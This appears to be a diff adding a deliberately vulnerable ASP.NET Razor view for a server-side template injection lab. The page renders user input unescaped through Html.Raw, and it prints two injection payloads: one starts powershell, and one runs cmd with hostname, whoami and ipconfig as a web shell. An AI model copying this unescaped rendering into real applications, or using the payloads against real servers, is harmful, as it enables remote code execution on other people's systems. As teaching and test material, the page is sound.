@@ -1,0 +1,72 @@
+﻿@model SSTI.Models.formdata
+
+@{
+    ViewBag.Title = "SSTI";
+}
+
+<h2>Server Side Template Injection</h2>
+
+
+@using (Html.BeginForm())
+{
+    @Html.AntiForgeryToken()
+
+    <div class="form-horizontal">
+        <hr />
+        @Html.ValidationSummary(true, "", new { @class = "text-danger" })
+        <div class="form-group">
+            @Html.LabelFor(model => model.name, htmlAttributes: new { @class = "control-label col-md-2" })
+            <div class="col-md-10">
+                @Html.EditorFor(model => model.name, new { htmlAttributes = new { @class = "form-control" } })
+                @Html.ValidationMessageFor(model => model.name, "", new { @class = "text-danger" })
+            </div>
+        </div>
+
+        <div class="form-group">
+            <div class="col-md-offset-2 col-md-10">
+                <input type="submit" value="Submit" class="btn btn-default" />
+            </div>
+        </div>
+    </div>
+}
+@if (ViewBag.RenderedTemplate != null)
+{
+    <p>
+        <strong>Hello...</strong> @Html.Raw(ViewBag.RenderedTemplate) !<br />
+
+    </p>
+}
+
+Malicious payload to inject in razor template engine
+<div style="word-wrap:break-word;">
+    <code>
+        &#x40;{ System.Diagnostics.Process.Start("powershell.exe", "/c calc"); }
+        </br>
+        </br>
+        Or use below alternate web shell payload
+        </br>
+        </br>
+        &#x40;{
+        System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c hostname & whoami & ipconfig");
+        procStartInfo.RedirectStandardOutput = true;
+        procStartInfo.RedirectStandardError = true;
+        procStartInfo.UseShellExecute = false;
+        procStartInfo.CreateNoWindow = true;
+        System.Diagnostics.Process p = new System.Diagnostics.Process();
+        p.StartInfo = procStartInfo;
+        p.Start();
+        var stdout = p.StandardOutput.ReadToEnd().Replace("<", "&#x26;lt;").Replace(">", "&#x26;gt;");
+        var stderr = p.StandardError.ReadToEnd().Replace("<", "&#x26;lt;").Replace(">", "&#x26;gt;");
+        }
+        &lt;pre>&#x40;stdout&lt;/pre&gt;
+        &lt;pre style="color: red"&gt;&#x40;stderr&lt;/pre&gt;
+    </code>
+</div>
+
+<div>
+    @Html.ActionLink("Back to List", "Index")
+</div>
+
+@section Scripts {
+    @Scripts.Render("~/bundles/jqueryval")
+}
